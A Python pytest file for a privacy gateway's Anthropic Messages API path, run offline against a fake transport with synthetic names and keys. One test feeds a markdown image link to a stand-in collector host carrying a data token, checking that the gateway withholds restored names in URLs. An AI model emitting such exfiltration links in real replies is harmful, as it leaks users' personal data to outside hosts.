"""The native Anthropic Messages leg beside the OpenAI-compatible one, offline.

A fake transport plays the Messages API (``POST https://api.anthropic.com/v1/messages``, ``x-api-key``,
``anthropic-version``, server-sent events ``message_start`` .. ``message_stop``, or one JSON message). The gate is the
real one: router, register, vault, restoration and the real ``CloudClient`` and stream parser. Every value is invented.
"""

from __future__ import annotations

import hashlib
import json
import re

import httpx
import pytest

from themis_shield import integration
from themis_shield.cloud import ApiKeyCredential, CloudClient, CloudFailure, CloudSettings, Outbound
from themis_shield.cloud.anthropic_messages import messages_request
from themis_shield.cloud.openai_compat import canonical, strict_json, verify_json
from themis_shield.config import DeploymentProfile, UseCasePolicy
from themis_shield.detectors import DetectionTargets
from themis_shield.detectors.markings import MarkingClass
from themis_shield.router import Router
from themis_shield.substitute import OriginalLeakError
from themis_shield.vault import InMemoryVault

from router_fakes import NOW, Finders, LocalRuntime, MemoryRegister, Tracer, approved_response

KEY = "SYNTHETIC_ANTHROPIC_KEY_NOT_REAL"
KEY_ENV = "SYNTHETIC_CLOUD_KEY"
URL = "https://api.anthropic.com/v1/messages"
SETTINGS = {"base_url": "https://api.anthropic.com/v1", "model": "claude-synthetic-model", "api": "anthropic-messages"}
JOB = "JOB-2026-0001"


# ---------------------------------------------------------------------------------------------------------------------
# A stand-in for the Messages API.
# ---------------------------------------------------------------------------------------------------------------------
def start(**usage):
    return {"type": "message_start", "message": {
        "id": "msg_synthetic", "type": "message", "role": "assistant", "model": "claude-synthetic-model",
        "content": [], "stop_reason": None, "stop_sequence": None,
        "usage": {"input_tokens": 25, "cache_creation_input_tokens": 3, "cache_read_input_tokens": 4,
                  "output_tokens": 1, **usage},
    }}


def text_events(*parts, stop="end_turn", output_tokens=15):
    return [
        start(),
        {"type": "content_block_start", "index": 0, "content_block": {"type": "text", "text": ""}},
        {"type": "ping"},
        *({"type": "content_block_delta", "index": 0, "delta": {"type": "text_delta", "text": part}} for part in parts),
        {"type": "content_block_stop", "index": 0},
        {"type": "message_delta", "delta": {"stop_reason": stop, "stop_sequence": None},
         "usage": {"output_tokens": output_tokens}},
        {"type": "message_stop"},
    ]


def thinking_events(index, secret):
    """A thinking block, as a model that thinks by default sends it ahead of its answer."""
    return [
        {"type": "content_block_start", "index": index,
         "content_block": {"type": "thinking", "thinking": "", "signature": ""}},
        {"type": "content_block_delta", "index": index, "delta": {"type": "thinking_delta", "thinking": secret}},
        {"type": "content_block_delta", "index": index, "delta": {"type": "signature_delta", "signature": "EqQB"}},
        {"type": "content_block_stop", "index": index},
    ]


def sse(events):
    raw = "".join(f"event: {event['type']}\ndata: {json.dumps(event, ensure_ascii=False)}\n\n" for event in events)
    return httpx.Response(200, headers={"Content-Type": "text/event-stream; charset=utf-8"}, content=raw.encode())


def message_json(*texts, stop="end_turn"):
    return httpx.Response(200, json={
        "id": "msg_synthetic", "type": "message", "role": "assistant", "model": "claude-synthetic-model",
        "content": [{"type": "text", "text": text} for text in texts],
        "stop_reason": stop, "stop_sequence": None,
        "usage": {"input_tokens": 25, "cache_creation_input_tokens": 3, "cache_read_input_tokens": 4,
                  "output_tokens": 15},
    })


class FakeMessages:
    """Records every request (method, URL, headers, decoded body) and answers with ``reply(token)``."""

    def __init__(self, reply=None):
        self.requests, self.headers, self.urls, self.raw = [], [], [], []
        self.tokens = []  # the placeholders of the last body, in order of appearance
        self.reply = reply  # token -> httpx.Response; the default says hello to the first placeholder it was sent

    def __call__(self, request: httpx.Request) -> httpx.Response:
        self.raw.append(request.content)
        self.requests.append(json.loads(request.content))
        self.headers.append({name.lower(): value for name, value in request.headers.items()})
        self.urls.append(str(request.url))
        self.tokens = re.findall(r"⟦[PCAIDSQ]:[0-9a-f]{6}⟧", request.content.decode())
        token = self.tokens[0] if self.tokens else "synthetic"
        if self.reply is not None:
            return self.reply(token)
        return sse(text_events("Hello " + token[:4], token[4:] + "."))


def native_client(tmp_path, fake, **changes):
    settings = CloudSettings(**{**SETTINGS, "api_key_env": KEY_ENV, "capture_dir": tmp_path / "captures", **changes})
    credential = ApiKeyCredential(KEY_ENV, environ={KEY_ENV: KEY})
    return CloudClient(settings, credential=credential, transport=httpx.MockTransport(fake))


def package(**changes):
    """What ``ChatBoundary.final_body`` hands the client for a clean two-message request."""
    return {
        "model": "claude-synthetic-model",
        "messages": [
            {"role": "system", "content": "Answer in one sentence."},
            {"role": "user", "content": "What is a synthetic retention schedule?"},
        ],
        "max_completion_tokens": 64, "stream": True, "stream_options": {"include_usage": True}, **changes,
    }


def outbound(body: dict, originals=()):
    raw = canonical(body)
    return Outbound(JOB, MarkingClass.NONE, raw, hashlib.sha256(raw).hexdigest(), True, tuple(originals))


def collect(stream):
    chunks = list(stream)
    text = "".join(choice["delta"].get("content", "") for chunk in chunks for choice in chunk["choices"])
    finish = [choice["finish_reason"] for chunk in chunks for choice in chunk["choices"] if choice["finish_reason"]]
    usage = [chunk["usage"] for chunk in chunks if "usage" in chunk]
    return chunks, text, finish, usage


def capture_records(tmp_path):
    lines = (tmp_path / "captures" / f"{JOB}.jsonl").read_text(encoding="utf-8").splitlines()
    return [json.loads(line) for line in lines]


def failure_of(client, body, originals=()):
    with pytest.raises(CloudFailure) as caught:
        collect(client.open(outbound(body, originals)))
    return caught.value.code


# ---------------------------------------------------------------------------------------------------------------------
# Settings and the request on the wire.
# ---------------------------------------------------------------------------------------------------------------------
def test_native_settings_url_and_selection():
    native = CloudSettings(**SETTINGS)
    assert native.api == "anthropic-messages" and native.url == URL
    # The default leg is untouched.
    plain = CloudSettings(base_url="https://api.example.invalid/v1", model="m-1")
    assert plain.api == "openai-compatible" and plain.url == "https://api.example.invalid/v1/chat/completions"
    for bad in (
        {**SETTINGS, "api": "anthropic"},
        {**SETTINGS, "api": ""},
        {**SETTINGS, "api_version": "2023-06-01"},  # the version header is fixed, a query parameter is not sent
        {**SETTINGS, "base_url": "http://api.anthropic.com/v1"},
    ):
        with pytest.raises(ValueError):
            CloudSettings(**bad)
    config = {"cloud": {**SETTINGS, "api_key_env": "ANTHROPIC_API_KEY"}}
    assert integration.cloud_settings(config) == CloudSettings(**config["cloud"])


def test_request_body_and_headers(tmp_path):
    fake = FakeMessages()
    client = native_client(tmp_path, fake)
    try:
        body = package(temperature=0.5, top_p=0.9, stop=["END"])
        chunks, text, finish, usage = collect(client.open(outbound(body)))
    finally:
        client.close()
    assert fake.urls == [URL]
    assert fake.requests == [{
        "model": "claude-synthetic-model", "max_tokens": 64, "stream": True,
        "system": "Answer in one sentence.",
        "messages": [{"role": "user", "content": "What is a synthetic retention schedule?"}],
        "temperature": 0.5, "top_p": 0.9, "stop_sequences": ["END"],
    }]
    headers = fake.headers[0]
    assert headers["x-api-key"] == KEY and headers["anthropic-version"] == "2023-06-01"
    assert headers["content-type"] == "application/json" and headers["accept"] == "text/event-stream"
    assert "authorization" not in headers and "api-key" not in headers
    # The key is in the header only: not in the body, not in a capture.
    assert KEY.encode() not in fake.raw[0]
    capture = (tmp_path / "captures" / f"{JOB}.jsonl").read_text(encoding="utf-8")
    assert KEY not in capture
    outbound_record = json.loads(capture.splitlines()[0])
    assert outbound_record["kind"] == "outbound" and outbound_record["api"] == "anthropic-messages"
    assert outbound_record["exact_json"].encode() == fake.raw[0]
    assert outbound_record["sent_sha256"] == hashlib.sha256(fake.raw[0]).hexdigest()
    assert outbound_record["manifest_hash"] == hashlib.sha256(canonical(body)).hexdigest()
    assert text == "Hello synthetic."  # the fake's default reply, for a body with no placeholder
    assert finish == ["stop"]


def test_key_comes_from_the_configured_variable(tmp_path, monkeypatch):
    fake = FakeMessages()
    monkeypatch.setenv(KEY_ENV, KEY)
    client = CloudClient(
        CloudSettings(**{**SETTINGS, "api_key_env": KEY_ENV, "capture_dir": tmp_path}),
        transport=httpx.MockTransport(fake),
    )
    try:
        collect(client.open(outbound(package())))
        assert fake.headers[0]["x-api-key"] == KEY
        monkeypatch.delenv(KEY_ENV)
        with pytest.raises(CloudFailure) as caught:
            client.open(outbound(package()))
        assert caught.value.code == "CREDENTIAL_UNAVAILABLE" and len(fake.requests) == 1
    finally:
        client.close()


def test_translation_of_messages_and_fields():
    body = package(messages=[
        {"role": "system", "content": "First rule."},
        {"role": "developer", "content": [{"type": "text", "text": "Second"}, {"type": "text", "text": "rule."}]},
        {"role": "user", "content": "Question one?"},
        {"role": "assistant", "content": [{"type": "text", "text": "Answer one."}]},
        {"role": "user", "content": "Question two?"},
    ], stop="END")
    del body["stream_options"]
    sent = strict_json(messages_request(canonical(body)).body)
    assert sent == {
        "model": "claude-synthetic-model", "max_tokens": 64, "stream": True,
        "system": "First rule.\n\nSecond\nrule.",
        "messages": [
            {"role": "user", "content": "Question one?"},
            {"role": "assistant", "content": [{"type": "text", "text": "Answer one."}]},
            {"role": "user", "content": "Question two?"},
        ],
        "stop_sequences": ["END"],
    }
    no_system = package(messages=[{"role": "user", "content": "Only a question?"}])
    assert "system" not in strict_json(messages_request(canonical(no_system)).body)
    assert messages_request(canonical(package(stream=False))).stream is False


@pytest.mark.parametrize("change,code", [
    ({"tools": [{"type": "function", "function": {"name": "write_local", "parameters": {"type": "object"}}}]},
     "UNSUPPORTED_TOOL"),
    ({"tool_choice": "auto"}, "UNSUPPORTED_TOOL"),
    ({"messages": [{"role": "user", "content": "Go."},
                   {"role": "assistant", "content": None, "tool_calls": [
                       {"id": "call_1", "type": "function", "function": {"name": "write_local", "arguments": "{}"}}]}]},
     "UNSUPPORTED_TOOL"),
    ({"messages": [{"role": "user", "content": "Go."},
                   {"role": "tool", "content": "done", "tool_call_id": "call_1"}]}, "UNSUPPORTED_TOOL"),
    ({"messages": [{"role": "user", "content": "Go.", "name": "someone"}]}, "UNSUPPORTED_REQUEST"),
    ({"messages": [{"role": "system", "content": "Only a system message."}]}, "UNSUPPORTED_REQUEST"),
    ({"temperature": 1.5}, "UNSUPPORTED_REQUEST"),
    ({"response_format": {"type": "json_object"}}, "UNSUPPORTED_REQUEST"),
    ({"max_completion_tokens": 0}, "UNSUPPORTED_REQUEST"),
    ({"stop": [3]}, "UNSUPPORTED_REQUEST"),
])
def test_what_has_no_messages_equivalent_is_refused_and_nothing_is_sent(tmp_path, change, code):
    fake = FakeMessages()
    client = native_client(tmp_path, fake)
    try:
        assert failure_of(client, package(**change)) == code
    finally:
        client.close()
    assert fake.requests == []


# ---------------------------------------------------------------------------------------------------------------------
# The last exact-value check sees every field that leaves, system included.
# ---------------------------------------------------------------------------------------------------------------------
def test_exact_value_check_refuses_a_system_that_holds_an_original(tmp_path):
    fake = FakeMessages()
    client = native_client(tmp_path, fake)
    try:
        body = package(messages=[
            {"role": "system", "content": "The requester is Mara Lindahl."},
            {"role": "user", "content": "Say hello."},
        ])
        assert failure_of(client, body, ("Mara Lindahl",)) == "CLOUD_RELEASE_LOCK"
    finally:
        client.close()
    assert fake.requests == []
    assert not (tmp_path / "captures" / f"{JOB}.jsonl").exists()


def test_exact_value_check_runs_on_the_translated_body(tmp_path):
    """Two system messages that are clean one by one become one ``system`` text, and that text holds the original."""
    body = package(messages=[
        {"role": "system", "content": "Mara"},
        {"role": "system", "content": "Lindahl"},
        {"role": "user", "content": "Say hello."},
    ])
    assert verify_json(canonical(body), ("Mara Lindahl",))  # the approved package passes its own check
    translated = messages_request(canonical(body)).body
    assert strict_json(translated)["system"] == "Mara\n\nLindahl"
    with pytest.raises(OriginalLeakError):
        verify_json(translated, ("Mara Lindahl",))
    fake = FakeMessages()
    client = native_client(tmp_path, fake)
    try:
        assert failure_of(client, body, ("Mara Lindahl",)) == "CLOUD_RELEASE_LOCK"
    finally:
        client.close()
    assert fake.requests == []


def test_a_credential_in_the_system_text_is_refused(tmp_path):
    fake = FakeMessages()
    client = native_client(tmp_path, fake)
    try:
        body = package(messages=[
            {"role": "system", "content": "Use " + KEY + " when asked."}, {"role": "user", "content": "Hello."},
        ])
        assert failure_of(client, body) == "CREDENTIAL_IN_PAYLOAD"
    finally:
        client.close()
    assert fake.requests == []


# ---------------------------------------------------------------------------------------------------------------------
# Replies, translated into the chunks the router reads: streaming, and one JSON message.
# ---------------------------------------------------------------------------------------------------------------------
def test_streaming_reply_becomes_chat_chunks_with_usage(tmp_path):
    fake = FakeMessages(lambda token: sse(text_events("Hel", "lo ", "wor", "ld.", output_tokens=17)))
    client = native_client(tmp_path, fake)
    try:
        chunks, text, finish, usage = collect(client.open(outbound(package())))
    finally:
        client.close()
    assert text == "Hello world." and finish == ["stop"]
    assert usage == [{
        "prompt_tokens": 32, "completion_tokens": 17, "total_tokens": 49,  # input 25 + cache write 3 + cache read 4
        "prompt_tokens_details": {"cached_tokens": 4, "cache_creation_tokens": 3},
    }]
    records = capture_records(tmp_path)
    assert [record["kind"] for record in records][-1] == "transport-complete"
    assert [record["kind"] for record in records].count("answer-tokenised") == len(chunks)


def test_thinking_blocks_are_dropped_and_never_delivered_or_captured(tmp_path):
    """A model that thinks by default opens a thinking block first (the live API did): it is skipped, not a failure,
    and what it holds goes nowhere. Only the text block is delivered."""
    secret = "PRIVATE-REASONING-MARKER"
    events = [
        start(),
        *thinking_events(0, secret),
        {"type": "content_block_start", "index": 1, "content_block": {"type": "redacted_thinking", "data": "abc"}},
        {"type": "content_block_stop", "index": 1},
        {"type": "content_block_start", "index": 2, "content_block": {"type": "text", "text": ""}},
        {"type": "content_block_delta", "index": 2, "delta": {"type": "text_delta", "text": "The "}},
        {"type": "content_block_delta", "index": 2, "delta": {"type": "text_delta", "text": "answer."}},
        {"type": "content_block_stop", "index": 2},
        {"type": "message_delta", "delta": {"stop_reason": "end_turn", "stop_sequence": None},
         "usage": {"output_tokens": 40, "output_tokens_details": {"thinking_tokens": 30}}},
        {"type": "message_stop"},
    ]
    client = native_client(tmp_path, FakeMessages(lambda token: sse(events)))
    try:
        chunks, text, finish, usage = collect(client.open(outbound(package())))
    finally:
        client.close()
    assert text == "The answer." and finish == ["stop"]
    assert usage[0]["completion_tokens"] == 40  # the thinking tokens are part of what was generated
    assert secret not in json.dumps(chunks)
    assert secret not in (tmp_path / "captures" / f"{JOB}.jsonl").read_text("utf-8")
    # the same, as one JSON message
    message = httpx.Response(200, json={
        "type": "message", "role": "assistant", "stop_reason": "end_turn",
        "content": [{"type": "thinking", "thinking": secret, "signature": "EqQB"}, {"type": "redacted_thinking",
                    "data": "abc"}, {"type": "text", "text": "The answer."}],
        "usage": {"input_tokens": 5, "output_tokens": 40},
    })
    client = native_client(tmp_path / "json", FakeMessages(lambda token: message))
    try:
        chunks, text, finish, usage = collect(client.open(outbound(package(stream=False))))
    finally:
        client.close()
    assert text == "The answer." and finish == ["stop"] and secret not in json.dumps(chunks)


def test_non_streaming_reply_is_translated(tmp_path):
    fake = FakeMessages(lambda token: message_json("Hello ", "world."))
    client = native_client(tmp_path, fake)
    try:
        chunks, text, finish, usage = collect(client.open(outbound(package(stream=False))))
    finally:
        client.close()
    assert fake.requests[0]["stream"] is False and fake.headers[0]["accept"] == "application/json"
    assert text == "Hello world." and finish == ["stop"]
    assert usage[0]["prompt_tokens"] == 32 and usage[0]["completion_tokens"] == 15
    records = capture_records(tmp_path)
    assert records[-1] == {"kind": "transport-complete"}


@pytest.mark.parametrize("stream", [True, False])
def test_upstream_refusals_by_status_and_content_type(tmp_path, stream):
    for response in (
        httpx.Response(401, json={"type": "error", "error": {"type": "authentication_error", "message": "x"}}),
        httpx.Response(429, json={"type": "error", "error": {"type": "rate_limit_error", "message": "x"}}),
        httpx.Response(529, json={"type": "error", "error": {"type": "overloaded_error", "message": "x"}}),
        # a 200 that is the other kind of reply, or no kind at all
        message_json("Hello.") if stream else sse(text_events("Hello.")),
        httpx.Response(200, headers={"Content-Type": "text/html"}, content=b"<html>"),
    ):
        fake = FakeMessages(lambda token, response=response: response)
        client = native_client(tmp_path, fake)
        try:
            assert failure_of(client, package(stream=stream)) == "CLOUD_HTTP"
        finally:
            client.close()
        assert len(fake.requests) == 1  # it was sent once, never retried


def broken(events):
    return lambda token: sse(events)


STREAM_FAULTS = [
    # (events, code)
    ([*text_events("Hello")[:5], {"type": "error", "error": {"type": "overloaded_error", "message": "Overloaded"}}],
     "CLOUD_PROTOCOL"),
    ([{"type": "error", "error": {"type": "api_error", "message": "x"}}], "CLOUD_PROTOCOL"),
    (text_events("Hello")[:-1], "CLOUD_INCOMPLETE"),  # no message_stop
    ([*text_events("Hello")[:-2], text_events("x")[-1]], "CLOUD_INCOMPLETE"),  # message_stop without message_delta
    (text_events("Hello", stop="max_tokens"), "CLOUD_INCOMPLETE"),
    (text_events("Hello", stop="pause_turn"), "CLOUD_INCOMPLETE"),
    (text_events("Hello", stop="refusal"), "CLOUD_REFUSED"),
    (text_events("Hello", stop="tool_use"), "CLOUD_INCOMPLETE"),
    ([start(), {"type": "content_block_start", "index": 0,
                "content_block": {"type": "server_tool_use", "id": "s", "name": "web_search", "input": {}}}],
     "CLOUD_PROTOCOL"),
    ([start(), *thinking_events(0, "x")[:1], {"type": "content_block_delta", "index": 0,
                                              "delta": {"type": "text_delta", "text": "x"}}], "CLOUD_PROTOCOL"),
    ([start(), {"type": "content_block_start", "index": 0, "content_block": {"type": "text", "text": ""}},
      {"type": "content_block_delta", "index": 0, "delta": {"type": "thinking_delta", "thinking": "x"}}],
     "CLOUD_PROTOCOL"),
    ([start(), {"type": "content_block_start", "index": 0,
                "content_block": {"type": "redacted_thinking", "data": "abc"}},
      {"type": "content_block_delta", "index": 0, "delta": {"type": "thinking_delta", "thinking": "x"}}],
     "CLOUD_PROTOCOL"),
    ([start(), {"type": "content_block_start", "index": 0,
                "content_block": {"type": "tool_use", "id": "t", "name": "n", "input": {}}}], "CLOUD_PROTOCOL"),
    ([*text_events("Hello")[:3], {"type": "content_block_delta", "index": 0,
                                  "delta": {"type": "input_json_delta", "partial_json": "{"}}], "CLOUD_PROTOCOL"),
    ([*text_events("Hello")[:3], {"type": "content_block_delta", "index": 1,
                                  "delta": {"type": "text_delta", "text": "x"}}], "CLOUD_PROTOCOL"),
    ([*text_events("Hello")[1:]], "CLOUD_PROTOCOL"),  # no message_start
    ([*text_events("Hello")[:-1], {"type": "content_block_delta", "index": 0,
                                   "delta": {"type": "text_delta", "text": "late"}}], "CLOUD_PROTOCOL"),
    ([*text_events("Hello")[:4], {"type": "something_new"}], "CLOUD_PROTOCOL"),
    ([*text_events("Hello")[:1], text_events("x")[0]], "CLOUD_PROTOCOL"),  # a second message_start
    ([*text_events("Hello")[:4], {"type": "message_delta", "delta": {"stop_reason": "end_turn"},
                                  "usage": {"output_tokens": 2}}], "CLOUD_PROTOCOL"),  # the block is still open
    ([*text_events("Hello")[:5], {"type": "message_delta", "delta": {"stop_reason": "end_turn"},
                                  "usage": {"output_tokens": -1}}], "CLOUD_PROTOCOL"),
]


@pytest.mark.parametrize("events,code", STREAM_FAULTS)
def test_stream_faults_fail_closed(tmp_path, events, code):
    client = native_client(tmp_path, FakeMessages(broken(events)))
    try:
        assert failure_of(client, package()) == code
    finally:
        client.close()


def test_a_stream_that_is_not_utf8_or_not_json_fails_closed(tmp_path):
    for raw in (b"data: {not json}\n\n", b"event: message_start\ndata: \xff\xfe\n\n", b"garbage line\n\n"):
        client = native_client(tmp_path, FakeMessages(lambda token, raw=raw: httpx.Response(
            200, headers={"Content-Type": "text/event-stream"}, content=raw)))
        try:
            assert failure_of(client, package()) in {"CLOUD_PROTOCOL", "CLOUD_TRANSPORT"}
        finally:
            client.close()


@pytest.mark.parametrize("response,code", [
    (message_json("Hello.", stop="max_tokens"), "CLOUD_INCOMPLETE"),
    (message_json("Hello.", stop="refusal"), "CLOUD_REFUSED"),
    (httpx.Response(200, json={"type": "error", "error": {"type": "api_error", "message": "x"}}), "CLOUD_PROTOCOL"),
    (httpx.Response(200, json={"type": "message", "role": "assistant", "stop_reason": "end_turn",
                               "content": [{"type": "tool_use", "id": "t", "name": "n", "input": {}}]}),
     "CLOUD_PROTOCOL"),
    (httpx.Response(200, content=b"not json", headers={"Content-Type": "application/json"}), "CLOUD_PROTOCOL"),
])
def test_non_streaming_faults_fail_closed(tmp_path, response, code):
    client = native_client(tmp_path, FakeMessages(lambda token: response))
    try:
        assert failure_of(client, package(stream=False)) == code
    finally:
        client.close()


@pytest.mark.parametrize("stream", [True, False])
def test_a_reply_that_holds_an_original_is_rejected_before_it_is_captured(tmp_path, stream):
    reply = (lambda token: sse(text_events("The person is ", "Mara Lindahl."))) if stream else (
        lambda token: message_json("The person is Mara Lindahl."))
    client = native_client(tmp_path, FakeMessages(reply))
    try:
        with pytest.raises(CloudFailure) as caught:
            collect(client.open(outbound(package(stream=stream), ("Mara Lindahl",))))
        assert caught.value.code == "CLOUD_PROTOCOL"
    finally:
        client.close()
    assert "Lindahl" not in (tmp_path / "captures" / f"{JOB}.jsonl").read_text(encoding="utf-8")


# ---------------------------------------------------------------------------------------------------------------------
# Through the router: de-identify, send natively, restore.
# ---------------------------------------------------------------------------------------------------------------------
class Harness:
    pass


def native_harness(tmp_path, fake):
    register = MemoryRegister(tmp_path / "register.db")
    cloud = native_client(tmp_path, fake)
    policy = UseCasePolicy("synthetic", ("cloud",), approved_for_cloud=True, requires_in_region_inference=False)
    h = Harness()
    h.register, h.fake, h.cloud = register, fake, cloud
    h.router = Router(
        register=register, runtime=LocalRuntime(), vault=InMemoryVault(clock=lambda: NOW), cloud=cloud,
        profile=DeploymentProfile("synthetic", "1", (), (policy,)), use_case=policy,
        targets=DetectionTargets(tracer=Tracer(), llm_client=Finders()),
        requester_identity="synthetic-requester", allowed_tools=frozenset({"write_local"}),
        local_authorised=True, clock=lambda: NOW,
    )
    return h


def question(**changes):
    return {
        "model": "themis/auto",
        "messages": [
            {"role": "system", "content": "Reply only to Ravi Example, briefly."},
            {"role": "user", "content": "Mara Lindahl asks a synthetic question."},
        ],
        **changes,
    }


def wire(response):
    return [
        json.loads(line[6:]) for line in "".join(response.sse()).splitlines()
        if line.startswith("data: ") and line != "data: [DONE]"
    ]


def delivered(response, stream):
    """The text and usage the client gets, from either kind of /v1 answer."""
    if stream:
        chunks = wire(response)
        text = "".join(choice["delta"].get("content", "") for chunk in chunks for choice in chunk.get("choices", []))
        usage = next((chunk["usage"] for chunk in chunks if "usage" in chunk), None)
        return text, usage, chunks[-1]["themis"]
    body = response.body
    return body["choices"][0]["message"]["content"], body.get("usage"), body["themis"]


@pytest.mark.parametrize("stream", [False, True])
def test_names_are_tokenised_sent_natively_and_restored_exactly(tmp_path, stream):
    fake = FakeMessages(lambda token: sse(text_events(
        "Hello ", fake.tokens[0][:4], fake.tokens[0][4:], ", the system asked for ", fake.tokens[1], ". Not here.")))
    h = native_harness(tmp_path, fake)
    try:
        response = approved_response(h, question(stream=stream))
        assert response.route == "cloud-tokenised" and response.status == 200
        assert fake.urls == [URL]
        sent = fake.requests[0]
        assert set(sent) == {"model", "max_tokens", "messages", "system", "stream"}
        assert sent["model"] == "claude-synthetic-model" and sent["stream"] is True
        assert sent["max_tokens"] == 32768  # the configured ceiling: the request named no budget
        assert [message["role"] for message in sent["messages"]] == ["user"]
        assert "⟦P:" in sent["system"] and "Ravi Example" not in sent["system"]
        assert "⟦P:" in sent["messages"][0]["content"] and "Mara Lindahl" not in fake.raw[0].decode()
        assert "Ravi" not in fake.raw[0].decode() and KEY not in fake.raw[0].decode()
        headers = fake.headers[0]
        assert headers["x-api-key"] == KEY and headers["anthropic-version"] == "2023-06-01"
        assert "authorization" not in headers
        text, usage, report = delivered(response, stream)
        assert text == "Hello Mara Lindahl, the system asked for Ravi Example. Not here."
        assert usage == {"prompt_tokens": 32, "completion_tokens": 15, "total_tokens": 47}
        assert report["unknown_tokens"] == 0 and report["dropped_tokens"] == 0 and report["restored_tokens"] == 2
        assert h.register.jobs[response.job_id].status.value == "Completed"
        capture = (tmp_path / "captures" / f"{response.job_id}.jsonl").read_text(encoding="utf-8")
        assert "Mara Lindahl" not in capture and "Ravi Example" not in capture and KEY not in capture
    finally:
        h.cloud.close()


@pytest.mark.parametrize("stream", [False, True])
def test_token_in_a_reply_url_is_withheld_on_the_native_leg(tmp_path, stream):
    # R-01: the same restoration code serves both legs.
    fake = FakeMessages(lambda token: sse(text_events(
        "Summary done for ", token[:5], token[5:], ". ![status](https://collector.example/p.png?n=", token, ")")))
    h = native_harness(tmp_path, fake)
    try:
        response = approved_response(h, question(
            stream=stream, messages=[{"role": "user", "content": "Mara Lindahl asks a synthetic question."}]))
        text, _, report = delivered(response, stream)
        assert text.startswith("Summary done for Mara Lindahl. ![status](https://collector.example/p.png?n=⟦P:")
        assert text.count("Mara Lindahl") == 1
        assert report == {"unknown_tokens": 0, "dropped_tokens": 0, "restored_tokens": 1, "withheld_in_url": 1}
    finally:
        h.cloud.close()


@pytest.mark.parametrize("stream", [False, True])
@pytest.mark.parametrize("make,code", [
    (lambda token: sse([*text_events("Hello ", token)[:6],
                        {"type": "error", "error": {"type": "overloaded_error", "message": "Overloaded"}}]),
     "CLOUD_PROTOCOL"),
    (lambda token: httpx.Response(529, json={"type": "error", "error": {"type": "overloaded_error", "message": "x"}}),
     "CLOUD_HTTP"),
    (lambda token: sse(text_events("Hello ", token)[:-1]), "CLOUD_INCOMPLETE"),
    (lambda token: sse(text_events("Hello ", token, stop="max_tokens")), "CLOUD_INCOMPLETE"),
    (lambda token: sse(text_events("I cannot help.", stop="refusal")), "CLOUD_REFUSED"),
])
def test_upstream_failures_fail_closed_through_the_router(tmp_path, stream, make, code):
    h = native_harness(tmp_path, FakeMessages(make))
    try:
        response = approved_response(h, question(stream=stream))
        if stream:
            if response.route == "cloud-tokenised":  # the failure arrives inside the stream
                wire_text = "".join(response.sse())
                assert "data: [DONE]" not in wire_text and code in wire_text
            else:
                assert response.route == "blocked" and response.reason == code
        else:
            assert response.route == "blocked" and response.reason == code and response.status != 200
        assert h.register.jobs[response.job_id].status.value != "Completed"
        assert len(h.fake.requests) == 1
    finally:
        h.cloud.close()


def test_tools_are_refused_on_the_native_leg_and_nothing_is_sent(tmp_path):
    fake = FakeMessages()
    h = native_harness(tmp_path, fake)
    try:
        body = question(tools=[{
            "type": "function",
            "function": {"name": "write_local", "description": "Write.", "parameters": {
                "type": "object", "properties": {"note": {"type": "string"}}}},
        }])
        response = approved_response(h, body)
        assert response.route == "blocked" and response.reason == "UNSUPPORTED_TOOL"
        assert fake.requests == []
        assert h.register.jobs[response.job_id].status.value != "Completed"
    finally:
        h.cloud.close()


def test_a_second_turn_keeps_its_user_and_assistant_turns(tmp_path):
    fake = FakeMessages(lambda token: sse(text_events("Noted, ", token[:4], token[4:], ".")))
    h = native_harness(tmp_path, fake)
    try:
        header = {"X-Themis-Conversation": "synthetic-thread"}
        first = approved_response(h, question(), header)
        reply = first.body["choices"][0]["message"]["content"]
        assert reply == "Noted, Mara Lindahl."
        second_request = question()
        second_request["messages"] += [
            {"role": "assistant", "content": reply},
            {"role": "user", "content": "And what did Mara Lindahl ask?"},
        ]
        second = approved_response(h, second_request, header)
        assert second.route == "cloud-tokenised", second.reason
        sent = fake.requests[1]
        assert [message["role"] for message in sent["messages"]] == ["user", "assistant", "user"]
        assert "Mara Lindahl" not in fake.raw[1].decode()
        assert sent["messages"][1]["content"].startswith("Noted, ⟦P:")
        assert second.body["choices"][0]["message"]["content"] == "Noted, Mara Lindahl."
    finally:
        h.cloud.close()
